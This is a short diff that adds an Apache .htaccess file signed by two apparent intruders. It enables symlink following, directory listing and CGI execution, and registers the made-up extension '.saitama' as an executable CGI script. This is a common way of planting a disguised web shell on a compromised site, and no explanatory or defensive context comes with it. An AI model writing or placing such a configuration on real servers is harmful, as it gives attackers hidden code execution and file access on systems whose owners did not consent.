@@ -1,0 +1,4 @@
+#Coded By Ndraa & StrezzBoy
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .saitama
+AddHandler cgi-script .saitama
